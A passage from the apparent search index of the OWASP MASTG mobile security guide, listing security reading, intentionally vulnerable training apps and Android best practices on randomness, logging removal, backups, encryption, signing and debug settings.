platform:ios MASTG-KNOW-0087  Reverse Engineering Tools Detection platform:ios MASTG-KNOW-0088  Emulator Detection platform:ios MASTG-KNOW-0089  Obfuscation platform:ios MASTG-KNOW-0085  Anti-Debugging Detection platform:ios","tags":["ios","MASVS-RESILIENCE"]},{"location":"MASTG/0x09-Suggested-Reading/","title":"Suggested Reading","text":"","tags":[]},{"location":"MASTG/0x09-Suggested-Reading/#mobile-app-security","title":"Mobile App Security","text":"","tags":[]},{"location":"MASTG/0x09-Suggested-Reading/#android","title":"Android","text":"<ul> <li>Dominic Chell, Tyrone Erasmus, Shaun Colley, Ollie Whitehous (2015) Mobile Application Hacker's Handbook. Wiley. Available at: https://www.wiley.com/en-us/The+Mobile+Application+Hacker%27s+Handbook-p-9781118958506</li> <li>Joshua J. Drake, Zach Lanier, Collin Mulliner, Pau Oliva, Stephen A. Ridley, Georg Wicherski (2014) Android Hacker's Handbook. Wiley. Available at: https://www.wiley.com/en-us/Android+Hacker%27s+Handbook-p-9781118608647</li> <li>Godfrey Nolan (2014) Bulletproof Android. Addison-Wesley Professional. Available at: https://www.amazon.com/Bulletproof-Android-Practical-Building-Developers/dp/0133993329</li> <li>Nikolay Elenkov (2014) Android Security Internals: An In-Depth Guide to Android's Security Architecture. No Starch Press. Available at: https://nostarch.com/androidsecurity</li> <li>Jonathan Levin (2015) Android Internals :: A confectioners cookbook - Volume I: The power user's view. Technologeeks.com. Available at: http://newandroidbook.com/</li> </ul>","tags":[]},{"location":"MASTG/0x09-Suggested-Reading/#ios","title":"iOS","text":"<ul> <li>Charlie Miller, Dionysus Blazakis, Dino Dai Zovi, Stefan Esser, Vincenzo Iozzo, Ralf-Philipp Weinmann (2012) iOS Hacker's Handbook. Wiley. Available at: https://www.wiley.com/en-us/iOS+Hacker%27s+Handbook-p-9781118204122</li> <li>David Thiel (2016) iOS Application Security, The Definitive Guide for Hackers and Developers. no starch press. Available at: https://www.nostarch.com/iossecurity</li> <li>Jonathan Levin (2017), Mac OS X and iOS Internals, Wiley. Available at: http://newosxbook.com/index.php</li> </ul>","tags":[]},{"location":"MASTG/0x09-Suggested-Reading/#reverse-engineering","title":"Reverse Engineering","text":"<ul> <li>Bruce Dang, Alexandre Gazet, Elias Backaalany (2014) Practical Reverse Engineering. Wiley. Available at: https://www.wiley.com/en-us/Practical+Reverse+Engineering%3A+x86%2C+x64%2C+ARM%2C+Windows+Kernel%2C+Reversing+Tools%2C+and+Obfuscation-p-9781118787311</li> <li>Skakenunny, Hangcom iOS App Reverse Engineering. Online. Available at: https://github.com/iosre/iOSAppReverseEngineering/</li> <li>Bernhard Mueller (2016) Hacking Soft Tokens - Advanced Reverse Engineering on Android. HITB GSEC Singapore. Available at: http://gsec.hitb.org/materials/sg2016/D1%20-%20Bernhard%20Mueller%20-%20Attacking%20Software%20Tokens.pdf</li> <li>Dennis Yurichev (2016) Reverse Engineering for Beginners. Online. Available at: https://beginners.re/</li> <li>Michael Hale Ligh, Andrew Case, Jamie Levy, Aaron Walters (2014) The Art of Memory Forensics. Wiley. Available at: https://www.wiley.com/en-us/The+Art+of+Memory+Forensics%3A+Detecting+Malware+and+Threats+in+Windows%2C+Linux%2C+and+Mac+Memory-p-9781118825099</li> <li>Jacob Baines (2016) Programming Linux Anti-Reversing Techniques. Leanpub. Available at: https://leanpub.com/anti-reverse-engineering-linux</li> </ul>","tags":[]},{"location":"MASTG/apps/","title":"Reference Applications","text":"<p>The applications listed below can be used as training materials. Note: only the MASTG apps and Crackmes are tested and maintained by the MAS project.</p> ID Name Platform MASTG-APP-0010  InsecureBankv2 platform:android MASTG-APP-0002  Android License Validator platform:android MASTG-APP-0013  OVAA platform:android MASTG-APP-0006  Digitalbank platform:android MASTG-APP-0009  DVHMA platform:android MASTG-APP-0018  MASTestApp-Android-NETWORK platform:android MASTG-APP-0003  Android UnCrackable L1 platform:android MASTG-APP-0011  MASTG Hacking Playground (Java) platform:android MASTG-APP-0016  Finstergram platform:android MASTG-APP-0012  MASTG Hacking Playground (Kotlin) platform:android MASTG-APP-0004  Android UnCrackable L2 platform:android MASTG-APP-0007  DIVA Android platform:android MASTG-APP-0001  AndroGoat platform:android MASTG-APP-0008  DodoVulnerableBank platform:android MASTG-APP-0005  Android UnCrackable L3 platform:android MASTG-APP-0017  Disable-flutter-tls-verification platform:android MASTG-APP-0014  InsecureShop platform:android MASTG-APP-0015  Android UnCrackable L4 platform:android MASTG-APP-0027  Disable-flutter-tls-verification platform:ios MASTG-APP-0025  iOS UnCrackable L1 platform:ios MASTG-APP-0024  DVIA-v2 platform:ios MASTG-APP-0026  iOS UnCrackable L2 platform:ios MASTG-APP-0028  iGoat-Swift platform:ios MASTG-APP-0023  DVIA platform:ios <p></p>","tags":[]},{"location":"MASTG/apps/android/MASTG-APP-0001/","title":"MASTG-APP-0001: AndroGoat","text":"<p>  An open source vulnerable/insecure app using Kotlin. This app has a wide range of vulnerabilities related to certificate pinning, custom URL schemes, Android Network Security Configuration, WebViews, root detection and over 20 other vulnerabilities.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0002/","title":"MASTG-APP-0002: Android License Validator","text":"<p>The Android License Validator is a crackme that implements a key validation function in native code, packaged as a standalone ELF executable for Android devices. Analyzing native code is often more challenging than Java, which is why critical business logic is frequently written this way.</p> <p>While this sample application may not represent a real-world scenario, it serves as a valuable learning tool to grasp the basics of symbolic execution. These insights can be applied in practical situations, especially when dealing with Android apps that include obfuscated native libraries. In fact, obfuscated code is often put into native libraries specifically to make the process of de-obfuscation more challenging.</p> <p>By Bernhard Mueller</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0003/","title":"MASTG-APP-0003: Android UnCrackable L1","text":"<p>A secret string is hidden somewhere in this app. Find a way to extract it.</p> <p>By Bernhard Mueller</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0004/","title":"MASTG-APP-0004: Android UnCrackable L2","text":"<p>This app holds a secret inside. May include traces of native code.</p> <p>By Bernhard Mueller. Special thanks to Michael Helwig for finding and fixing an oversight in the anti-tampering mechanism.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0005/","title":"MASTG-APP-0005: Android UnCrackable L3","text":"<p>The crackme from hell! A secret string is hidden somewhere in this app. Find a way to extract it.</p> <p>By Bernhard Mueller. Special thanks to Eduardo Novella for testing, feedback and pointing out flaws in the initial build(s).</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0006/","title":"MASTG-APP-0006: Digitalbank","text":"<p>  A vulnerable app created in 2015, which can be used on older Android platforms.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0007/","title":"MASTG-APP-0007: DIVA Android","text":"<p>  An app intentionally designed to be insecure which has received updates in 2016 and contains 13 different challenges.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0008/","title":"MASTG-APP-0008: DodoVulnerableBank","text":"<p>  An insecure Android app from 2015.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0009/","title":"MASTG-APP-0009: DVHMA","text":"<p>  A hybrid mobile app (for Android) that intentionally contains vulnerabilities.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0010/","title":"MASTG-APP-0010: InsecureBankv2","text":"<p>  A vulnerable Android app made for security enthusiasts and developers to learn the Android insecurities by testing a vulnerable application. It has been updated in 2018 and contains a lot of vulnerabilities.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0011/","title":"MASTG-APP-0011: MASTG Hacking Playground (Java)","text":"<p>A vulnerable Android app by the OWASP MAS project. See included vulnerabilities in here.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0012/","title":"MASTG-APP-0012: MASTG Hacking Playground (Kotlin)","text":"<p>A vulnerable Android app by the OWASP MAS project.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0013/","title":"MASTG-APP-0013: OVAA","text":"<p>  An Android app that aggregates all the platform's known and popular security vulnerabilities.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0014/","title":"MASTG-APP-0014: InsecureShop","text":"<p>  InsecureShop is an intentionally designed Android application that showcases vulnerabilities, aiming to educate developers and security experts about common pitfalls within modern Android apps. It serves as a dynamic platform for refining Android pentesting skills.</p> <p>The majority of these vulnerabilities can be exploited on non-rooted devices, posing risks from both remote users and malicious third-party applications. Notably, the app doesn't utilize any APIs. InsecureShop presents an opportunity to explore a range of vulnerabilities:</p> <ul> <li>Hardcoded Credentials: Embedded login credentials within the code.</li> <li>Insufficient URL Validation: Allows loading of arbitrary URLs via Deeplinks.</li> <li>Arbitrary Code Execution: Enables the execution of code from third-party packages.</li> <li>Access to Protected Components: Permits third-party apps to launch secure components.</li> <li>Insecure Broadcast Receiver: Registration of a broadcast enabling URL injection.</li> <li>Insecure Content Provider: Accessible content provider putting user data at risk.</li> </ul> <p>Complementing these learning experiences, InsecureShop provides documentation about the implemented vulnerabilities and their associated code. This documentation, however, refrains from offering complete solutions for each vulnerability showcased within the InsecureShop app.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0015/","title":"MASTG-APP-0015: Android UnCrackable L4","text":"<p>The Radare2 community always dreamed with its decentralized and free currency to allow r2 fans to make payments in places and transfer money between r2 users. A debug version of the r2Pay app has been developed and it will be supported very soon in many stores and websites. Can you verify that this is cryptographically unbreakable?</p> <p>Hint: Run the APK in a non-tampered device to play a bit with the app.</p> <ol> <li>There is a master PIN code that generates green tokens (aka r2coins) on the screen. If you see a red r2coin, then this token won't be validated by the community. You need to find out the 4 digits PIN code and the salt employed as well. Flag: <code>r2con{PIN_NUMERIC:SALT_LOWERCASE}</code></li> <li>There is a \"r2pay master key\" buried in layers of obfuscation and protections. Can you break the whitebox? Flag: <code>r2con{ascii(key)}</code></li> </ol> <p>Versions:</p> <ul> <li><code>v0.9</code> - Release for OWASP MAS: Source code is available and the compilation has been softened in many ways to make the challenge easier and more enjoyable for newcomers.</li> <li><code>v1.0</code> - Release for R2con CTF 2020: No source code is available and many extra protections are in place.</li> </ul> <p>Created and maintained by Eduardo Novella &amp; Gautam Arvind. Special thanks to NowSecure for supporting this crackme.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0016/","title":"MASTG-APP-0016: Finstergram","text":"<p>  Finstergram is an Android application designed with built-in security vulnerabilities to facilitate learning and teaching about common security issues in Android apps. To get started, simply open and build the project in your preferred version of Android Studio.</p> <p>Functionally, Finstergram acts like a photo vault. The app requires a password to open your secret gallery, ostensibly preventing other users of the phone from accessing them. However, this security is not as foolproof as it seems.</p> <p>The challenge presented involves having access to a non-rooted phone with the app installed. While you can unlock the phone, the app's password remains unknown. Your task is to identify vulnerabilities in Finstergram's code that could grant access to the secret gallery. Some initial strategies include examining the AndroidManifest file, understanding how the password is validated, investigating broadcast mechanisms, and exploring ways to leverage intents.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0017/","title":"MASTG-APP-0017: Disable-flutter-tls-verification","text":"<p>An android application designed to verify the  disable-flutter-tls-verification script, which disables Flutter's TLS verification.</p>","tags":["android","app"]},{"location":"MASTG/apps/android/MASTG-APP-0018/","title":"MASTG-APP-0018: MASTestApp-Android-NETWORK","text":"<p>  An Android application designed to include weaknesses related to MASVS-NETWORK.</p>","tags":["android","app"]},{"location":"MASTG/apps/ios/MASTG-APP-0023/","title":"MASTG-APP-0023: DVIA","text":"<p>A vulnerable iOS app written in Objective-C which provides a platform to mobile security enthusiasts/professionals or students to test their iOS penetration testing skills.</p>","tags":["ios","app"]},{"location":"MASTG/apps/ios/MASTG-APP-0024/","title":"MASTG-APP-0024: DVIA-v2","text":"<p>  A vulnerable iOS app, written in Swift with over 15 vulnerabilities.</p>","tags":["ios","app"]},{"location":"MASTG/apps/ios/MASTG-APP-0025/","title":"MASTG-APP-0025: iOS UnCrackable L1","text":"<p>A secret string is hidden somewhere in this app. Find a way to extract it.</p> <p>By Bernhard Mueller</p>","tags":["ios","app"]},{"location":"MASTG/apps/ios/MASTG-APP-0026/","title":"MASTG-APP-0026: iOS UnCrackable L2","text":"<p>This app holds a secret inside - and this time it won't be tampered with!</p> <p>By Bernhard Mueller</p>","tags":["ios","app"]},{"location":"MASTG/apps/ios/MASTG-APP-0027/","title":"MASTG-APP-0027: Disable-flutter-tls-verification","text":"<p>An iOS application designed to verify the  disable-flutter-tls-verification script, which disables Flutter's TLS verification.</p>","tags":["ios","app"]},{"location":"MASTG/apps/ios/MASTG-APP-0028/","title":"MASTG-APP-0028: iGoat-Swift","text":"<p>  A Swift version of original iGoat Objective C project. Using OWASP iGoat, you can learn exploiting and defending vulnerabilities in iOS Swift applications. It contains many challenges such as:</p> <ul> <li>Reverse Engineering</li> <li>Runtime Analysis</li> <li>Data Protection (Rest)</li> <li>Data Protection (Transit)</li> <li>Key Management</li> <li>Tampering</li> <li>Injection Flaws</li> <li>Broken Cryptography</li> <li>Memory Management</li> <li>URL Scheme Attack</li> <li>Social Engineering</li> <li>SSL Pinning</li> <li>Authentication</li> <li>Jailbreak Detection</li> <li>Side Channel Data Leaks</li> <li>Cloud Misconfiguration</li> <li>Crypto Challenges</li> </ul>","tags":["ios","app"]},{"location":"MASTG/best-practices/","title":"Best Practices","text":"About the MASTG Best Practices <p>The MASTG Best Practices are a collection of specific strategies and practices that can be used to prevent or mitigate security and privacy risks in mobile apps. </p> <p>Each Best Practices is designed to be simple and focused and may apply to one or multiple tests in the MASTG.</p> ID Title Platform MASTG-BEST-0011  Securely Load File Content in a WebView platform:android MASTG-BEST-0012  Disable JavaScript in WebViews platform:android MASTG-BEST-0006  Use Up-to-Date APK Signing Schemes platform:android MASTG-BEST-0005  Use Secure Encryption Modes platform:android MASTG-BEST-0008  Debugging Disabled for WebViews platform:android MASTG-BEST-0010  Use Up-to-Date minSdkVersion platform:android MASTG-BEST-0007  Debuggable Flag Disabled in the AndroidManifest platform:android MASTG-BEST-0003  Comply with Privacy Regulations and Best Practices platform:android MASTG-BEST-0013  Disable Content Provider Access in WebViews platform:android MASTG-BEST-0002  Remove Logging Code platform:android MASTG-BEST-0004  Exclude Sensitive Data from Backups platform:android MASTG-BEST-0001  Use Secure Random Number Generator APIs platform:android MASTG-BEST-0009  Use Secure Encryption Algorithms platform:android <p></p>","tags":[]},{"location":"MASTG/best-practices/MASTG-BEST-0001/","title":"MASTG-BEST-0001: Use Secure Random Number Generator APIs","text":"<p>Use a cryptographically secure pseudorandom number generator as provided by the platform or programming language you are using.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0001/#javakotlin","title":"Java/Kotlin","text":"<p>Use <code>java.security.SecureRandom</code>, which complies with the statistical random number generator tests specified in FIPS 140-2, Security Requirements for Cryptographic Modules, section 4.9.1 and meets the cryptographic strength requirements described in RFC 4086: Randomness Requirements for Security. It produces non-deterministic output and automatically seeds itself during object initialization using system entropy, so manual seeding is generally unnecessary and can weaken randomness if not done properly.</p> <p>The default (no-argument) constructor of <code>SecureRandom</code> is recommended, as it uses the system-provided seed of appropriate length to ensure high entropy. Providing a seed (hardcoded or otherwise) to the constructor is discouraged in the Android Documentation, because it risks creating deterministic output and undermining security.</p> <p>Although the documentation says the provided seed normally supplements the existing seed, this behavior may differ if an old security provider is used. To avoid these pitfalls, ensure your app targets a modern Android version with an updated provider or explicitly configures a secure provider such as AndroidOpenSSL (or Conscrypt in newer releases).</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0001/#other-languages","title":"Other Languages","text":"<p>Consult the standard library or framework documentation to find the API that exposes the operating system's cryptographically secure pseudorandom number generator. This is usually the safest approach, provided there are no known vulnerabilities in that library's random number generation. For example, see the Flutter/Dart issue as a reminder that some frameworks may have known weaknesses in their PRNG implementations.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0001/#tests","title":"Tests","text":"<p> MASTG-TEST-0204: Insecure Random API Usage  MASTG-TEST-0205: Non-random Sources Usage </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0002/","title":"MASTG-BEST-0002: Remove Logging Code","text":"<p>Ideally, a release build shouldn't use any logging functions, making it easier to assess sensitive data exposure.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0002/#using-proguard","title":"Using ProGuard","text":"<p>While preparing the production release, you can use tools like  Proguard (included in Android Studio). To determine whether all logging functions from the <code>android.util.Log</code> class have been removed, check the ProGuard configuration file (proguard-rules.pro) for the following options (according to this example of removing logging code and this article about enabling ProGuard in an Android Studio project):</p> <pre><code>-assumenosideeffects class android.util.Log\n{\n  public static boolean isLoggable(java.lang.String, int);\n  public static int v(...);\n  public static int i(...);\n  public static int w(...);\n  public static int d(...);\n  public static int e(...);\n  public static int wtf(...);\n}\n</code></pre> <p>Note that the example above only ensures that calls to the Log class' methods will be removed. If the string that will be logged is dynamically constructed, the code that constructs the string may remain in the bytecode. For example, the following code issues an implicit <code>StringBuilder</code> to construct the log statement:</p> <p>Example in Java:</p> <pre><code>Log.v(\"Private key tag\", \"Private key [byte format]: \" + key);\n</code></pre> <p>Example in Kotlin:</p> <pre><code>Log.v(\"Private key tag\", \"Private key [byte format]: $key\")\n</code></pre> <p>The compiled bytecode, however, is equivalent to the bytecode of the following log statement, which constructs the string explicitly:</p> <p>Example in Java:</p> <pre><code>Log.v(\"Private key tag\", new StringBuilder(\"Private key [byte format]: \").append(key.toString()).toString());\n</code></pre> <p>Example in Kotlin:</p> <pre><code>Log.v(\"Private key tag\", StringBuilder(\"Private key [byte format]: \").append(key).toString())\n</code></pre> <p>ProGuard guarantees removal of the <code>Log.v</code> method call. Whether the rest of the code (<code>new StringBuilder ...</code>) will be removed depends on the complexity of the code and the ProGuard version.</p> <p>This is a security risk because the (unused) string leaks plain text data into memory, which can be accessed via a debugger or memory dumping.</p> <p>Unfortunately, no silver bullet exists for this issue, but one option would be to implement a custom logging facility that takes simple arguments and constructs the log statements internally.</p> <pre><code>SecureLog.v(\"Private key [byte format]: \", key);\n</code></pre> <p>Then configure ProGuard to strip its calls.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0002/#custom-logging","title":"Custom Logging","text":"<p>You can implement a custom logging facility and disable it at once only for the release builds.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0002/#tests","title":"Tests","text":"<p> MASTG-TEST-0231: References to Logging APIs  MASTG-TEST-0203: Runtime Use of Logging APIs </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0003/","title":"MASTG-BEST-0003: Comply with Privacy Regulations and Best Practices","text":"<p>Recommendations from CWE-359.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0003/#phase-requirements","title":"Phase: Requirements","text":"<p>Identify and consult all relevant regulations for personal privacy. An organization may be required to comply with certain federal and state regulations, depending on its location, the type of business it conducts, and the nature of any private data it handles. Regulations may include Safe Harbor Privacy Framework [REF-340], Gramm-Leach Bliley Act (GLBA) [REF-341], Health Insurance Portability and Accountability Act (HIPAA) [REF-342], General Data Protection Regulation (GDPR) [REF-1047], California Consumer Privacy Act (CCPA) [REF-1048], and others.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0003/#phase-architecture-and-design","title":"Phase: Architecture and Design","text":"<p>Carefully evaluate how secure design may interfere with privacy, and vice versa. Security and privacy concerns often seem to compete with each other.</p> <ul> <li>From a security perspective, all important operations should be recorded so that any anomalous activity can later be identified.</li> <li>However, when private data is involved, this practice can in fact create risk. Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust.</li> </ul> <p>Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0003/#references","title":"References","text":"<ul> <li>[REF-340] U.S. Department of Commerce. \"Safe Harbor Privacy Framework\". https://web.archive.org/web/20010223203241/http://www.export.gov/safeharbor/. URL validated: 2023-04-07.</li> <li>[REF-341] Federal Trade Commission. \"Financial Privacy: The Gramm-Leach Bliley Act (GLBA)\". https://www.ftc.gov/business-guidance/privacy-security/gramm-leach-bliley-act. URL validated: 2023-04-07.</li> <li>[REF-342] U.S. Department of Human Services. \"Health Insurance Portability and Accountability Act (HIPAA)\". https://www.hhs.gov/hipaa/index.html. URL validated: 2023-04-07.</li> <li>[REF-1047] Wikipedia. \"General Data Protection Regulation\". https://en.wikipedia.org/wiki/General_Data_Protection_Regulation.</li> <li>[REF-1048] State of California Department of Justice, Office of the Attorney General. \"California Consumer Privacy Act (CCPA)\". https://oag.ca.gov/privacy/ccpa.</li> </ul>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0004/","title":"MASTG-BEST-0004: Exclude Sensitive Data from Backups","text":"<p>For the sensitive files found, instruct the system to exclude them from the backup:</p> <ul> <li>If you are using Auto Backup, mark them with the <code>exclude</code> tag in <code>backup_rules.xml</code> (for Android 11 or lower using <code>android:fullBackupContent</code>) or <code>data_extraction_rules.xml</code> (for Android 12 and higher using <code>android:dataExtractionRules</code>), depending on the target API. Make sure to use both the <code>cloud-backup</code> and <code>device-transfer</code> parameters.</li> <li>If you are using the key-value approach, set up your BackupAgent accordingly.</li> </ul> <p>Refer to \"Security recommendations for backups - Mitigations\" for more information.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0004/#tests","title":"Tests","text":"<p> MASTG-TEST-0216: Sensitive Data Not Excluded From Backup  MASTG-TEST-0262: References to Backup Configurations Not Excluding Sensitive Data </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0005/","title":"MASTG-BEST-0005: Use Secure Encryption Modes","text":"<p>Replace insecure encryption modes with secure block cipher modes such as AES-GCM or AES-CCM which are authenticated encryption modes that provide confidentiality, integrity, and authenticity.</p> <p>We recommend avoiding CBC, which while being more secure than ECB, improper implementation, especially incorrect padding, can lead to vulnerabilities such as padding oracle attacks.</p> <p>For comprehensive guidance on implementing secure encryption modes in Android, refer to the official Android Developers documentation on Cryptography.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0005/#tests","title":"Tests","text":"<p> MASTG-TEST-0232: Broken Symmetric Encryption Modes </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0006/","title":"MASTG-BEST-0006: Use Up-to-Date APK Signing Schemes","text":"<p>Ensure that the app is signed with at least the v2 or v3 APK signing scheme, as these provide comprehensive integrity checks and protect the entire APK from tampering. For optimal security and compatibility, consider using v3, which also supports key rotation.</p> <p>Optionally, you can add v4 signing to enable faster incremental updates in Android 11 and above, but v4 alone does not provide security protections and should be used alongside v2 or v3.</p> <p>The signing configuration can be managed through Android Studio or the <code>signingConfigs</code> section in <code>build.gradle</code> or <code>build.gradle.kts</code>. To activate both the v3 and v4 schemes, the following values must be set:</p> <pre><code>// build.gradle\nandroid {\n  ...\n  signingConfigs {\n    config {\n        ...\n        enableV3Signing true\n        enableV4Signing true\n    }\n  }\n}\n</code></pre>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0006/#tests","title":"Tests","text":"<p> MASTG-TEST-0224: Usage of Insecure Signature Version </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0007/","title":"MASTG-BEST-0007: Debuggable Flag Disabled in the AndroidManifest","text":"<p>Ensure the debuggable flag in the AndroidManifest.xml is set to <code>false</code> for all release builds.</p> <p>Note: Disabling debugging via the <code>debuggable</code> flag is an important first step but does not fully protect the app from advanced attacks. Skilled attackers can enable debugging through various means, such as binary patching (see  Patching) to allow attachment of a debugger or the use of binary instrumentation tools like  Frida for Android to achieve similar capabilities. For apps requiring a higher level of security, consider implementing anti-debugging techniques as an additional layer of defense. Refer to  Debugger Detection Not Implemented for detailed guidance.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0007/#tests","title":"Tests","text":"<p> MASTG-TEST-0226: Debuggable Flag Enabled in the AndroidManifest </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0008/","title":"MASTG-BEST-0008: Debugging Disabled for WebViews","text":"<p>Ensure that WebView debugging is disabled in production builds to prevent attackers from exploiting this feature to eavesdrop, modify, or debug communication within WebViews.</p> <ul> <li>Set <code>WebView.setWebContentsDebuggingEnabled</code> to <code>false</code> in production, or remove the calls entirely if they are unnecessary.</li> <li>If WebView debugging is required during development, ensure it is enabled only when the app is in a debuggable state by checking the <code>ApplicationInfo.FLAG_DEBUGGABLE</code> flag at runtime.</li> </ul> <p>For example:</p> <pre><code>if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT) {\n    if (0 != (getApplicationInfo().flags &amp; ApplicationInfo.FLAG_DEBUGGABLE))\n    { WebView.setWebContentsDebuggingEnabled(true); }\n}\n</code></pre> <p>Note: Disabling WebView debugging this way helps protect an app already running on a device. For an attacker to exploit WebView debugging, they must have physical access to the device (e.g., a stolen or test device) or remote access through malware or other malicious means. Additionally, the device must typically be unlocked, and the attacker would need to know the device PIN, password, or biometric authentication to gain full control and connect debugging tools like <code>adb</code> or Chrome DevTools.</p> <p>However, disabling WebView debugging does not eliminate all attack vectors. An attacker could:</p> <ol> <li>Patch the app to add calls to these APIs (see  Patching), then repackage and re-sign it (see  Repackaging &amp; Re-Signing).</li> <li>Use runtime method hooking (see  Method Hooking) to enable WebView debugging dynamically at runtime.</li> </ol> <p>Disabling WebView debugging serves as one layer of defense to reduce risks but should be combined with other security measures.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0008/#tests","title":"Tests","text":"<p> MASTG-TEST-0227: Debugging Enabled for WebViews </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0009/","title":"MASTG-BEST-0009: Use Secure Encryption Algorithms","text":"<p>Replace insecure encryption algorithms with secure ones such as AES-256 (preferably in GCM mode) or Chacha20.</p> <p>For comprehensive guidance on implementing secure encryption in Android, refer to the documentation on \"Cryptography\" and \"Broken or risky cryptographic algorithm\" on the official Android Developers website.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0009/#tests","title":"Tests","text":"<p> MASTG-TEST-0221: Broken Symmetric Encryption Algorithms </p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0010/","title":"MASTG-BEST-0010: Use Up-to-Date minSdkVersion","text":"<p>Ensure that the <code>minSdkVersion</code> in the <code>build.gradle</code> file is set to the latest version of the Android platform that aligns with your app's requirements while maintaining compatibility with your user base.</p> <p>Companies often hesitate to increase <code>minSdkVersion</code> because they want their app to be available on as many devices as possible. Even though Google doesn't enforce a specific <code>minSdkVersion</code>, as they do with the <code>targetSdkVersion</code>, it's crucial to understand the implications of setting a low <code>minSdkVersion</code>, as it directly impacts security, exposes users to vulnerabilities, and prevents the app from leveraging critical security protections.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0010/#clarifying-the-difference-targetsdkversion-vs-minsdkversion","title":"Clarifying the Difference: <code>targetSdkVersion</code> vs <code>minSdkVersion</code>","text":"<ul> <li><code>targetSdkVersion</code>: Defines the highest API level the app is designed to run on. The app can run on lower API levels, but it won't necessarily take advantage of all new security enforcements.</li> <li><code>minSdkVersion</code>: Defines the lowest API level the app is allowed to run on. This is crucial because many security features are only available on devices running a certain API level or higher. If you set a low <code>minSdkVersion</code>, your app completely misses out on these protections on older devices.</li> </ul> <p>Even if you set a high <code>targetSdkVersion</code>, the app can still run on older devices without the latest security improvements. If you set <code>targetSdkVersion=33</code> (Android 13) but <code>minSdkVersion=21</code> (Android 5), the app can still be installed on Android 5 devices, which lack years of critical security updates. Malware on these older devices can exploit missing security features that app-level code alone cannot address, as evidenced by vulnerabilities listed in the Android Security Bulletins.</p> <p>While increasing <code>minSdkVersion</code> may slightly reduce the number of devices your app can run on, it significantly enhances security by ensuring that all users have a baseline level of protection.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0010/#common-misconceptions","title":"Common Misconceptions","text":"<p>There are many misconceptions about the <code>minSdkVersion</code> and <code>targetSdkVersion</code> in Android development. The Android documentation sometimes mentions \"targeting\" when they actually mean \"running on.\" For example:</p> <p>Opt out of cleartext traffic: The guidance in this section applies only to apps that target Android 8.1 (API level 27) or lower. Starting with Android 9 (API level 28), cleartext support is disabled by default.</p> <p>The note says the guidance applies to apps targeting API 27 or lower. But in reality, even if an app targets API 28+ but is running on an older Android version (below API 28), cleartext traffic is still allowed unless explicitly disabled. Developers might assume that just increasing <code>targetSdkVersion</code> automatically blocks cleartext, which is incorrect.</p>","tags":["android","best"]},{"location":"MASTG/best-practices/MASTG-BEST-0010/#notable-android-platform-security-improvements-over-time","title":"Notable Android Platform Security Improvements Over Time","text":"<ul> <li>Android 4.2 (API level 16) in November 2012 (introduction of SELinux)</li> <li>Android 4.3 (API level 18) in July 2013 (SELinux became enabled by default)</li> <li>Android 4.4 (API level 19) in October 2013 (several new APIs and ART introduced)</li> <li>Android 5.0 (API level 21) in November 2014 (ART used by default and many other features added)</li> <li>Android 6.0 (API level 23) in October 2015 (many new features and improvements, including granting; detailed permissions setup at runtime rather than all or nothing during installation)</li> <li>Android 7.0 (API level 24-25) in August 2016 (new JIT compiler on ART)</li> <li>Android 8.0 (API level 26-27) in August 2017 (a lot of security improvements)</li> <li>Android 9 (API level 28) in August 2018 (restriction of background usage of mic or camera, introduction of lockdown mode, default HTTPS for all apps)</li> <li>Android 10 (API level 29) in September 2019 (enforces TLS 1.3, access location \"only while using the app\", device tracking 